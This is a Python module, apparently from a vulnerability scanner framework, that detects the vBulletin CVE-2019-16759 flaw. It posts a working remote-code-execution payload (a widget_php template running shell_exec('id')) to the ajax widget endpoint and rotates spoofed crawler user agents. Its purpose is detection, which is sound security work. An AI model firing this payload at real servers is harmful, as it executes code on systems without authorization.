#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author: Aman Gupta github.com/aman566
# https://www.zdnet.com/article/security-researcher-publishes-details-and-exploit-code-for-a-vbulletin-zero-day/

import socket
import socks
import time
import json
import threading
import string
import random
import sys
import struct
import re
import os
from OpenSSL import crypto
import ssl
from core.alert import *
from core.targets import target_type
import logging
from core.targets import target_to_host
from core.load_modules import load_file_path
from lib.socks_resolver.engine import getaddrinfo
from core._time import now
from core.log import __log_into_file
import requests
from core.decor import socks_proxy, main_function


def extra_requirements_dict():
    return {"vbulletin_cve_2019_16759_vuln_ports": [443, 80]}





def vbulletin_vuln(
    target,
    port,
    timeout_sec,
    log_in_file,
    language,
    time_sleep,
    thread_tmp_filename,
    socks_proxy,
    scan_id,
    scan_cmd,
):
    try:
        
        from core.conn import connection
        s = connection(target_to_host(target), port, timeout_sec, socks_proxy)
        if not s:
            return False
        else:
            if (
                target_type(target) != "HTTP"
                and port in extra_requirements_dict()["vbulletin_cve_2019_16759_vuln_ports"]
            ):
                target = "https://" + target
            user_agent = [
                "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.5) Gecko/20060719 Firefox/1.5.0.5",
                "Googlebot/2.1 ( http://www.googlebot.com/bot.html)",
                "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Ubuntu/10.04"
                " Chromium/9.0.595.0 Chrome/9.0.595.0 Safari/534.13",
                "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.2; WOW64; .NET CLR 2.0.50727)",
                "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
                "Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620",
                "Debian APT-HTTP/1.3 (0.8.10.3)",
                "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
                "Googlebot/2.1 (+http://www.googlebot.com/bot.html)",
                "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
                "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; "
                "http://help.yahoo.com/help/us/shop/merchant/)",
                "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
                "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
                "msnbot/1.1 (+http://search.msn.com/msnbot.htm)",
            ]
            headers = {
                "User-Agent": random.choice(user_agent),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.7,ru;q=0.3",
                "Connection": "keep-alive",
            }
            while True:
                try:
                    params = {
                        "subWidgets[0][template]": "widget_php",
                        "subWidgets[0][config][code]": 'echo shell_exec("id"); exit;',
                    }
                    if target.endswith("/"):
                        target = target[:-1]
                    r = requests.post(
                        url=target + "/ajax/render/widget_tabbedcontainer_tab_panel",
                        data=params,
                        verify=False,
                        headers=headers,
                        timeout=timeout_sec,
                    )
                    if r.status_code == 200 and "gid" in r.text.lower():
                        return True
                    else:
                        return False
                except Exception:
                    return False
    except Exception:
        return False


def __vbulletin_vuln(
    target,
    port,
    timeout_sec,
    log_in_file,
    language,
    time_sleep,
    thread_tmp_filename,
    socks_proxy,
    scan_id,
    scan_cmd
):
    if vbulletin_vuln(
        target,
        port,
        timeout_sec,
        log_in_file,
        language,
        time_sleep,
        thread_tmp_filename,
        socks_proxy,
        scan_id,
        scan_cmd
    ):
        info(
            messages(language, "target_vulnerable").format(
                target, port, "vBulletin RCE CVE-2019-16759 Vulnerability"
            )
        )
        __log_into_file(thread_tmp_filename, "w", "0", language)
        data = json.dumps(
            {
                "HOST": target,
                "USERNAME": "",
                "PASSWORD": "",
                "PORT": port,
                "TYPE": "vbulletin_cve_2019_16759_vuln",
                "DESCRIPTION": messages(language, "vulnerable").format(
                    "vbulletin_cve_2019_16759_vuln"
                ),
                "TIME": now(),
                "CATEGORY": "vuln",
                "SCAN_ID": scan_id,
                "SCAN_CMD": scan_cmd,
            }
        )
        __log_into_file(log_in_file, "a", data, language)
        return True
    else:
        return False

@main_function(extra_requirements_dict(), __vbulletin_vuln, "vbulletin_cve_2019_16759_vuln", "vbulletin_cve_2019_16759_vuln not found")
def start(
    target,
    users,
    passwds,
    ports,
    timeout_sec,
    thread_number,
    num,
    total,
    log_in_file,
    time_sleep,
    language,
    verbose_level,
    socks_proxy,
    retries,
    methods_args,
    scan_id,
    scan_cmd,
):  # Main function
    pass